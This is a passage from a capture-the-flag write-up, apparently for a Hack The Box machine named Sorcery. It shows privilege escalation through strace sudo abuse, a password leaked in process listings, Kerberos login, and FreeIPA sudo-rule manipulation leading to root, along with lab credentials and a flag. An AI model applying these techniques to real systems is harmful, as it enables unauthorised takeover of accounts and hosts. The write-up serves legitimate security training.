After we recreated the picture of the session we were able to extract the `password` of `tom_summers_admin` which allowed us to `elevate our privileges` even further.

![](images/2025-06-15_23-43_tom_summers_admin_password.png)

| Username          | Password      |
| ----------------- | ------------- |
| tom_summers_admin | dWpuk7cesBjT- |

```shell
┌──(kali㉿kali)-[~]
└─$ ssh tom_summers_admin@10.129.50.43
(tom_summers_admin@10.129.50.43) Password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-60-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sun Jun 15 21:44:40 2025 from 10.10.16.33
tom_summers_admin@main:~$
```

## Enumeration (tom_summers_admin)

Our well known procedure of enumeration lead us to some interesting `sudo privileges` which allowed the user `tom_summers_admin` to execute `docker` and `strace` on behalf of `rebecca_smith`.

```shell
tom_summers_admin@main:~$ id
uid=2002(tom_summers_admin) gid=2002(tom_summers_admin) groups=2002(tom_summers_admin)
```

```shell
tom_summers_admin@main:~$ ls -la
total 20
drwxr-x--- 5 tom_summers_admin tom_summers_admin 4096 Oct 30  2024 .
drwxr-xr-x 7 root              root              4096 Oct 31  2024 ..
lrwxrwxrwx 1 root              root                 9 Oct 30  2024 .bash_history -> /dev/null
drwx------ 4 tom_summers_admin tom_summers_admin 4096 Apr  6 13:36 .cache
drwxr-xr-x 2               700 tom_summers_admin 4096 Oct 30  2024 .docker
drwx------ 3 tom_summers_admin tom_summers_admin 4096 Oct 30  2024 .local
```

```shell
tom_summers_admin@main:~$ sudo -l
Matching Defaults entries for tom_summers_admin on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User tom_summers_admin may run the following commands on localhost:
    (rebecca_smith) NOPASSWD: /usr/bin/docker login
    (rebecca_smith) NOPASSWD: /usr/bin/strace -s 128 -p [0-9]*
```

## Privilege Escalation to rebecca_smith

### GTFOBins: strace

By abusing basically a `GTFOBins` technique we were able to get a shell as `rebecca_smith`. To get to this we first executed the `Docker` login using `sudo`.

```shell
tom_summers_admin@main:~$ sudo -u rebecca_smith /usr/bin/docker login
This account might be protected by two-factor authentication
In case login fails, try logging in with <password><otp>
Authenticating with existing credentials... [Username: rebecca_smith]

i Info → To login with a different account, run 'docker logout' followed by 'docker login'


Login did not succeed, error: permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Post "http://%2Fvar%2Frun%2Fdocker.sock/v1.50/auth": dial unix /var/run/docker.sock: connect: permission denied
Failed to start web-based login - falling back to command line login...

Log in with your Docker ID or email address to push and pull images from Docker Hub. If you don't have a Docker ID, head over to https://hub.docker.com/ to create one.
You can log in with your password or a Personal Access Token (PAT). Using a limited-scope PAT grants better security and is required for organizations using SSO. Learn more at https://docs.docker.com/go/access-tokens/

Username (rebecca_smith): 

i Info → A Personal Access Token (PAT) can be used instead.
         To create a PAT, visit https://app.docker.com/settings
         
         
Password:
```

Then we used a custom script to attach to every new `Docker process` to display the current `Process ID`.

```shell
tom_summers_admin@main:~$ cat autoattach.sh 
#!/bin/bash
echo "[*] Watching for docker login subprocess..."
while true; do
    ps -U rebecca_smith -u rebecca_smith -o pid=,comm= | grep docker | while read pid cmd; do
        echo "[+] Attaching to PID $pid ($cmd)..."
        sudo -u rebecca_smith /usr/bin/strace -s 128 -p $pid 2>&1 | grep --line-buffered 'read(0'
        exit
    done
    sleep 0.1
done
```

```shell
tom_summers_admin@main:~$ ./autoattach.sh 
[*] Watching for docker login subprocess...
[+] Attaching to PID 2127350 (docker)...
```

And as last step we spawned a shell as `rebecca_smith` using `strace`.

- [https://gtfobins.github.io/gtfobins/strace/#shell](https://gtfobins.github.io/gtfobins/strace/#shell)

```shell
tom_summers_admin@main:~$ sudo -u rebecca_smith /usr/bin/strace -s 128 -p 2127350 -o /dev/null /bin/sh
/usr/bin/strace: attach: ptrace(PTRACE_SEIZE, 2127350): Operation not permitted
$ id
uid=2003(rebecca_smith) gid=2003(rebecca_smith) groups=2003(rebecca_smith)
```

## Enumeration (rebecca_smith)

Once more we started our journey of enumerating the newly gathered access.

```shell
$ cd ~
```

```shell
$ ls -la
total 16
drwxr-x--- 4 rebecca_smith rebecca_smith 4096 Oct 30  2024 .
drwxr-xr-x 7 root          root          4096 Oct 31  2024 ..
lrwxrwxrwx 1 root          root             9 Oct 30  2024 .bash_history -> /dev/null
drwx------ 2 rebecca_smith rebecca_smith 4096 Jun 15 21:49 .docker
drwx------ 3 rebecca_smith rebecca_smith 4096 Oct 30  2024 .net
```

```shell
$ /bin/bash
```

```shell
rebecca_smith@main:~/.net/docker-credential-docker-auth$ ls -lah
total 16K
drwx------ 4 rebecca_smith rebecca_smith 4.0K Jun 15 21:49  .
drwx------ 3 rebecca_smith rebecca_smith 4.0K Oct 30  2024  ..
drwx------ 2 rebecca_smith rebecca_smith 4.0K Oct 30  2024 'AHB+oPKjMPcELNLFVIjxF0YthPk_+gg='
drwx------ 2 rebecca_smith rebecca_smith 4.0K Jun 15 21:49 'gYUkbrOHlN3o8VyLImQ5jVw8cDGqzm8='
```

```shell
rebecca_smith@main:~/.net/docker-credential-docker-auth/AHB+oPKjMPcELNLFVIjxF0YthPk_+gg=$ env
SHELL=/usr/bin/bash
SUDO_GID=2002
SUDO_COMMAND=/usr/bin/strace -s 128 -p 2127350 -o /dev/null /bin/sh
SUDO_USER=tom_summers_admin
PWD=/home/rebecca_smith/.net/docker-credential-docker-auth/AHB+oPKjMPcELNLFVIjxF0YthPk_+gg=
LOGNAME=rebecca_smith
HOME=/home/rebecca_smith
LANG=C.UTF-8
TERM=xterm-256color
USER=rebecca_smith
SHLVL=1
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
SUDO_UID=2002
MAIL=/var/mail/rebecca_smith
OLDPWD=/home/rebecca_smith/.net/docker-credential-docker-auth
_=/usr/bin/env
```

### LinPEAS Execution

And once more we fired up `LinPEAS` to speed things up a bit. The key findings were the presence of `FreeIPA` and a `Domain Controller (dc01.sorcery.htb)`?!

```shell
<--- CUT FOR BREVITY --->
╔══════════╣ Analyzing FreeIPA Files (limit 70)
╚ https://book.hacktricks.wiki/en/linux-hardening/freeipa-pentesting.html                                                                                                                                                                   
drwxr-xr-x 3 root root 4096 Oct 30  2024 /etc/ipa                                                                                                                                                                                           
-rw-r--r-- 1 root root 230 Oct 30  2024 /etc/ipa/default.conf
#File modified by ipa-client-install
[global]
basedn = dc=sorcery,dc=htb
realm = SORCERY.HTB
domain = sorcery.htb
server = dc01.sorcery.htb
host = main.sorcery.htb
xmlrpc_uri = https://dc01.sorcery.htb/ipa/xml
enable_ra = True

-rwxr-xr-x 1 root root 987 Apr 12  2024 /usr/bin/ipa

drwxr-xr-x 3 root root 4096 Oct 30  2024 /usr/lib/ipa

drw-r-xr-x 2 root root 4096 Apr 12  2024 /usr/share/bash-completion/completions/ipa

drwxr-xr-x 3 root root 4096 Oct 30  2024 /usr/share/ipa

drwxr-xr-x 2 root root 4096 Jun  9 13:10 /usr/src/linux-headers-6.8.0-60/drivers/net/ipa
<--- CUT FOR BREVITY --->
```

```shell
<--- CUT FOR BREVITY --->
╔══════════╣ Searching kerberos conf files and tickets
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-active-directory.html#linux-active-directory                                                                                                                   
kadmin was found on /usr/bin/kadmin                                                                                                                                                                                                         
kadmin was found on /usr/bin/kinit
klist execution
klist: Credentials cache keyring 'persistent:2003:2003' not found
ptrace protection is disabled (0), you might find tickets inside processes memory
-rw-r--r-- 1 root root 789 Jun 16 08:05 /etc/krb5.conf
#File modified by ipa-client-install

includedir /etc/krb5.conf.d/
[libdefaults]
  default_realm = SORCERY.HTB
  dns_lookup_realm = false
  rdns = false
  dns_canonicalize_hostname = false
  dns_lookup_kdc = true
  ticket_lifetime = 24h
  forwardable = true
  udp_preference_limit = 0
  default_ccache_name = KEYRING:persistent:%{uid}


[realms]
  SORCERY.HTB = {
    kdc = dc01.sorcery.htb:88
    master_kdc = dc01.sorcery.htb:88
    admin_server = dc01.sorcery.htb:749
    kpasswd_server = dc01.sorcery.htb:464
    default_domain = sorcery.htb
    pkinit_anchors = FILE:/var/lib/ipa-client/pki/kdc-ca-bundle.pem
    pkinit_pool = FILE:/var/lib/ipa-client/pki/ca-bundle.pem

  }


[domain_realm]
  .sorcery.htb = SORCERY.HTB
  sorcery.htb = SORCERY.HTB
  main.sorcery.htb = SORCERY.HTB
<--- CUT FOR BREVITY --->
```

### PSPY Execution

Since we could not find any `credentials` we decided to ran `PSPY` to see what is going on in the background while we moved through the box.

- [https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)

```shell
rebecca_smith@main:~$ ./pspy64 
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2025/06/16 08:24:46 CMD: UID=2003  PID=2225413 | ./pspy64 
2025/06/16 08:24:46 CMD: UID=0     PID=2223182 | 
2025/06/16 08:24:46 CMD: UID=0     PID=2222948 | 
2025/06/16 08:24:46 CMD: UID=0     PID=2221782 | 
2025/06/16 08:24:46 CMD: UID=0     PID=2220643 | 
2025/06/16 08:24:46 CMD: UID=0     PID=2219940 | 
2025/06/16 08:24:46 CMD: UID=0     PID=2217945 | 
2025/06/16 08:24:46 CMD: UID=0     PID=2217684 | 
2025/06/16 08:24:46 CMD: UID=0     PID=2217015 | 
2025/06/16 08:24:46 CMD: UID=0     PID=2213413 | 
2025/06/16 08:24:46 CMD: UID=0     PID=2212729 | 
2025/06/16 08:24:46 CMD: UID=0     PID=2211158 | 
2025/06/16 08:24:46 CMD: UID=0     PID=2208876 | 
2025/06/16 08:24:46 CMD: UID=0     PID=2208579 | 
2025/06/16 08:24:46 CMD: UID=2003  PID=2200883 | gpg-agent --homedir /home/rebecca_smith/.gnupg --use-standard-socket --daemon 
2025/06/16 08:24:46 CMD: UID=0     PID=2197729 | 
2025/06/16 08:24:46 CMD: UID=2003  PID=2196928 | xxd 
2025/06/16 08:24:46 CMD: UID=2003  PID=2196927 | dd bs=9000 count=1 
2025/06/16 08:24:46 CMD: UID=2003  PID=2196920 | bash -c ((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | xxd -p -r >&3; dd bs=9000 count=1 <&3 2>/dev/null | xxd ) 3>/dev/udp/1.1.1.1/53 && echo "DNS accessible") | grep "accessible" && exit 0 ) 2>/dev/null || echo "DNS is not accessible"                                                                                                                                               
2025/06/16 08:24:46 CMD: UID=2003  PID=2196919 | grep accessible 
2025/06/16 08:24:46 CMD: UID=2003  PID=2196918 | bash -c ((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | xxd -p -r >&3; dd bs=9000 count=1 <&3 2>/dev/null | xxd ) 3>/dev/udp/1.1.1.1/53 && echo "DNS accessible") | grep "accessible" && exit 0 ) 2>/dev/null || echo "DNS is not accessible"                                                                                                                                               
2025/06/16 08:24:46 CMD: UID=2003  PID=2196916 | bash -c ((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | xxd -p -r >&3; dd bs=9000 count=1 <&3 2>/dev/null | xxd ) 3>/dev/udp/1.1.1.1/53 && echo "DNS accessible") | grep "accessible" && exit 0 ) 2>/dev/null || echo "DNS is not accessible"
<--- CUT FOR BREVITY --->
```

And after quite some time the output contained a `username` and `password`.

```shell
<--- CUT FOR BREVITY --->
2025/06/16 08:31:41 CMD: UID=1638400000 PID=2237108 | /usr/bin/python3 -I /usr/bin/ipa user-mod ash_winter --setattr userPassword=w@LoiU8Crmdep
<--- CUT FOR BREVITY --->
```

| Username   | Password      |
| ---------- | ------------- |
| ash_winter | w@LoiU8Crmdep |

## Privilege Escalation to ash_winter

### Kerberos GSSAPI Authentication

To `escalate our privileges` to `ash_winter` we needed to use `Kerberos` and therefore `GSSAPI Authentication`.

```shell
rebecca_smith@main:~$ klist
klist: Credentials cache keyring 'persistent:2003:2003' not found
```

We requested a new `Kerberos Ticket` and got prompted to `change` the `password` of the user.

```shell
rebecca_smith@main:~$ kinit ash_winter
Password for ash_winter@SORCERY.HTB: 
Password expired.  You must change it now.
Enter new password: 
Enter it again:
```

| Password    |
| ----------- |
| P@ssw0rd123 |

After doing as we were told we received our `Kerberos Ticket`.

```shell
rebecca_smith@main:~$ klist
Ticket cache: KEYRING:persistent:2003:2003
Default principal: ash_winter@SORCERY.HTB

Valid starting     Expires            Service principal
06/16/25 08:42:33  06/17/25 07:57:24  krbtgt/SORCERY.HTB@SORCERY.HTB
```

Now we authenticated against `localhost` via `SSH` and got access as `ash_winter`.

```shell
rebecca_smith@main:~$ ssh -o GSSAPIAuthentication=yes ash_winter@localhost
The authenticity of host 'localhost (<no hostip for proxy command>)' can't be established.
ED25519 key fingerprint is SHA256:Nshm+HLprf4CSB15aD8bc/lzqdKMitLi34sS1ZUlBog.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'localhost' (ED25519) to the list of known hosts.
(ash_winter@localhost) Password: 
Creating directory '/home/ash_winter'.
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-60-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

-sh: 32: [[: not found
-sh: 32: Mon Jun 16 08:46:56 2025: not found
Last login: Mon Jun 16 08:46:56 2025 from 127.0.0.1
$ id
uid=1638400004(ash_winter) gid=1638400004(ash_winter) groups=1638400004(ash_winter)
```

## Enumeration (ash_winter)

### FreeIPA Enumeration

We already knew that `FreeIPA` was installed on the box and got the confirmation that this needed to be the last step in `Privilege Escalation` because of the granted `sudo permission` for `restarting` the `System Security Services Daemon (SSSD)`.

```shell
$ sudo -l
Matching Defaults entries for ash_winter on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User ash_winter may run the following commands on localhost:
    (root) NOPASSWD: /usr/bin/systemctl restart sssd
```

To prepare ourselves we gathered the information about the configuration to find a way to abuse it.

```shell
$ systemctl cat sssd.service
# /usr/lib/systemd/system/sssd.service
[Unit]
Description=System Security Services Daemon
# SSSD must be running before we permit user sessions
Before=systemd-user-sessions.service nss-user-lookup.target
Wants=nss-user-lookup.target
StartLimitIntervalSec=50s
StartLimitBurst=5
ConditionPathExists=|/etc/sssd/sssd.conf
ConditionDirectoryNotEmpty=|/etc/sssd/conf.d/

[Service]
Environment=DEBUG_LOGGER=--logger=files
EnvironmentFile=-/etc/default/sssd
ExecStart=/usr/sbin/sssd -i ${DEBUG_LOGGER}
Type=notify
NotifyAccess=main
PIDFile=/run/sssd.pid
CapabilityBoundingSet=  CAP_IPC_LOCK CAP_CHOWN CAP_DAC_READ_SEARCH CAP_KILL CAP_NET_ADMIN CAP_SYS_NICE CAP_FOWNER CAP_SETGID CAP_SETUID CAP_SYS_ADMIN CAP_SYS_RESOURCE CAP_BLOCK_SUSPEND
Restart=on-abnormal

[Install]
WantedBy=multi-user.target
```

```shell
$ ls -l /var/lib/sss/pipes/
total 4
srw-rw-rw- 1 root root    0 Jun 16 08:05 autofs
srw-rw-rw- 1 root root    0 Jun 16 08:05 nss
srw-rw-rw- 1 root root    0 Jun 16 08:05 pac
srw-rw-rw- 1 root root    0 Jun 16 08:05 pam
drwxr-x--- 2 root root 4096 Jun 16 08:05 private
srw-rw-rw- 1 root root    0 Jun 16 08:05 ssh
srw------- 1 root root    0 Jun 16 08:05 sudo
```

```shell
ash_winter@main:~$ cat /proc/keys
03e91729 I------     1   2d 1f030000 1638400004 65534 keyring   _persistent.1638400004: 1
0783868c I--Q---     1 perm 3f010000 1638400004 1638400004 user      __krb5_princ__: 37
0a32bb3c I--Q---     1 perm 3f010000 1638400004 1638400004 keyring   _krb: 2
0bad200c I--Q---     1 perm 3f010000 1638400004 1638400004 user      krb_ccache:primary: 26
2c091008 I--Q---     3 perm 1f3f0000 1638400004 65534 keyring   _uid.1638400004: empty
2d2bd92b I--Q---     1  23h 3f010000 1638400004 1638400004 keyring   krb_ccache_1MZW1I4: 2
2f3b650f I--Q---     9 perm 3f030000 1638400004 1638400004 keyring   _ses: 1
33ecfdb6 I--Q---     1 perm 1f3f0000 1638400004 65534 keyring   _uid_ses.1638400004: 1
3f17cbc5 I--Q---     1  23h 3f010000 1638400004 1638400004 user      krbtgt/SORCERY.HTB@SORCERY.HTB: 1487
```

```shell
ash_winter@main:~$ grep sudoers /etc/nsswitch.conf
sudoers:    files sss
```

```shell
ash_winter@main:~$ ipa sudorule-add pwn_rule --hostcat=all --cmdcat=all --runasusercat=all
ipa: ERROR: Insufficient access: Insufficient 'add' privilege to add the entry 'ipaUniqueID=3f9e9320-4aa5-11f0-ad88-5adc80331067,cn=sudorules,cn=sudo,dc=sorcery,dc=htb'.
```

```shell
ash_winter@main:~$ ipa user-mod ash_winter --setattr loginShell=/tmp/rootshell
--------------------------
Modified user "ash_winter"
--------------------------
  User login: ash_winter
  First name: ash
  Last name: winter
  Home directory: /home/ash_winter
  Login shell: /tmp/rootshell
  Principal name: ash_winter@SORCERY.HTB
  Principal alias: ash_winter@SORCERY.HTB
  Email address: ash_winter@sorcery.htb
  UID: 1638400004
  GID: 1638400004
  Account disabled: False
  Password: True
  Member of groups: ipausers
  Member of HBAC rule: allow_sudo, allow_ssh
  Indirect Member of role: add_sysadmin
  Kerberos keys available: True
```

The whole configuration was setup in a way that we were not able to find a sneaky way around it. Therefore we started looking at the security configuration like `rules` and `administrators`.

```shell
ash_winter@main:~$ ipa sudorule-find
-------------------
1 Sudo Rule matched
-------------------
  Rule name: allow_sudo
  Enabled: True
  Host category: all
  Command category: all
  RunAs User category: all
  RunAs Group category: all
----------------------------
Number of entries returned 1
----------------------------
```

```shell
ash_winter@main:~$ ipa group-show admins
  Group name: admins
  Description: Account administrators group
  GID: 1638400000
  Member users: admin
```

```shell
ash_winter@main:~$ ipa user-show admin
  User login: admin
  Last name: Administrator
  Home directory: /home/admin
  Login shell: /bin/bash
  Principal alias: admin@SORCERY.HTB, root@SORCERY.HTB
  UID: 1638400000
  GID: 1638400000
  Account disabled: False
  Password: True
  Member of groups: trust admins, admins
  Member of Sudo rule: allow_sudo
  Member of HBAC rule: allow_ssh, allow_sudo
  Kerberos keys available: True
```

When we checked our own permissions we noticed that we were `Indirect Member of role: add_sysadmin`. That was it.

```shell
ash_winter@main:~$ ipa user-show ash_winter
  User login: ash_winter
  First name: ash
  Last name: winter
  Home directory: /home/ash_winter
  Login shell: /bin/sh
  Principal name: ash_winter@SORCERY.HTB
  Principal alias: ash_winter@SORCERY.HTB
  Email address: ash_winter@sorcery.htb
  UID: 1638400004
  GID: 1638400004
  Account disabled: False
  Password: True
  Member of groups: ipausers
  Member of HBAC rule: allow_ssh, allow_sudo
  Indirect Member of role: add_sysadmin
  Kerberos keys available: True
```

As first step we made sure that we could communicate with the `Domain Controller`.

```shell
ash_winter@main:~$ kvno HTTP/dc01.sorcery.htb
HTTP/dc01.sorcery.htb@SORCERY.HTB: kvno = 1
```

```shell
ash_winter@main:~$ klist
Ticket cache: KEYRING:persistent:1638400004:krb_ccache_Ju48sCN
Default principal: ash_winter@SORCERY.HTB

Valid starting     Expires            Service principal
06/16/25 13:12:19  06/17/25 13:02:06  HTTP/dc01.sorcery.htb@SORCERY.HTB
06/16/25 13:10:45  06/17/25 13:02:06  krbtgt/SORCERY.HTB@SORCERY.HTB
```

```shell
ash_winter@main:~$ curl -k --negotiate -u : https://dc01.sorcery.htb
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="https://dc01.sorcery.htb/ipa/ui">here</a>.</p>
</body></html>
```

Then we added ourselves to the `sysadmins group`.

```shell
ash_winter@main:~$ curl -k --negotiate -u : \
  -H "Content-Type: application/json" \
  -H "Referer: https://dc01.sorcery.htb/ipa" \
  -X POST \
  --data '{"method":"group_add_member","params":[["sysadmins"],{"user":["ash_winter"]}]}' \
  https://dc01.sorcery.htb/ipa/session/json
{"result": {"completed": 1, "failed": {"member": {"user": [], "group": [], "service": [], "idoverrideuser": []}}, "result": {"cn": ["sysadmins"], "gidnumber": ["1638400005"], "member_user": ["ash_winter"], "memberofindirect_role": ["manage_sudorules_ldap"], "dn": "cn=sysadmins,cn=groups,cn=accounts,dc=sorcery,dc=htb"}, "messages": [{"type": "warning", "name": "VersionMissing", "message": "API Version number was not sent, forward compatibility not guaranteed. Assuming server's API version, 2.254", "code": 13001, "data": {"server_version": "2.254"}}]}, "error": null, "id": null, "principal": "ash_winter@SORCERY.HTB", "version": "4.12.1"}
```

```
ash_winter@main:~$ ipa user-show ash_winter
  User login: ash_winter
  First name: ash
  Last name: winter
  Home directory: /home/ash_winter
  Login shell: /bin/sh
  Principal name: ash_winter@SORCERY.HTB
  Principal alias: ash_winter@SORCERY.HTB
  Email address: ash_winter@sorcery.htb
  UID: 1638400004
  GID: 1638400004
  Account disabled: False
  Password: True
  Member of groups: sysadmins, ipausers
  Member of HBAC rule: allow_ssh, allow_sudo
  Indirect Member of role: manage_sudorules_ldap, add_sysadmin
  Kerberos keys available: True
```

However this didn't lead us anywhere. Even after the restart of the service we were not be able to execute more commands using sudo.

## Privilege Escalation to root

### FreeIPA Misconfiguration

At this point we decided to look at the `Graphical User Interface (GUI)` of the application. Therefore we added `dc01.sorcery.htb` to our `/etc/hosts` file and accessed the `UI` using a `SOCKS5 Proxy` configuration in our browser.  

```shell
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.237.50   sorcery.htb
10.129.237.50   git.sorcery.htb
172.19.0.2      dc01.sorcery.htb
```

- [https://dc01.sorcery.htb/ipa/ui/](https://dc01.sorcery.htb/ipa/ui/)

![](images/2025-06-16_15-57_freeipa_login.png)

We used the `credentials` of our latest user to login. And since the `cleanup job` was hitting us, we needed to change the password once again.

| Username   | Password      |
| ---------- | ------------- |
| ash_winter | w@LoiU8Crmdep |

![](images/2025-06-16_15-58_freeipa_ash_winter_password_reset.png)

After a successful login as `ash_winter` we moved to the corresponding `profile` and checked the groups the user was in.

![](images/2025-06-16_15-34_freeipa.png)

![](images/2025-06-16_15-45_freeipa_ash_winter_groups.png)

Next we added ourselves to the `sysadmins` group once again.

![](images/2025-06-16_15-46_freeipa_ash_winter_add_to_sysadmin_group.png)

But now we saw the `Sudo Rules` tab and there we granted us `allow_sudo` permission.

![](images/2025-06-16_15-48_freeipa_ash_winter_allow_sudo_rule.png)

To be quick we used `proxychains` to `SSH` into the box and to restart the `sssd` service on behalf of `root`.

```shell
┌──(kali㉿kali)-[~]
└─$ proxychains ssh ash_winter@172.19.0.1      
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.19.0.1:22  ...  OK
(ash_winter@172.19.0.1) Password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-60-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Mon Jun 16 13:40:41 2025 from 10.129.237.50
$
```

```shell
$ sudo -l
Matching Defaults entries for ash_winter on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User ash_winter may run the following commands on localhost:
    (root) NOPASSWD: /usr/bin/systemctl restart sssd
    (ALL : ALL) ALL
```

```shell
$ sudo -u root /usr/bin/systemctl restart sssd
[sudo] password for ash_winter:
```

All what was left was `sudo su` into a `root shell`.

```shell
$ sudo su
root@main:/home/ash_winter#
```

## root.txt

```shell
root@main:~# cat root.txt
7fa5050e31f26b508efb7c2a7e3b092c
```
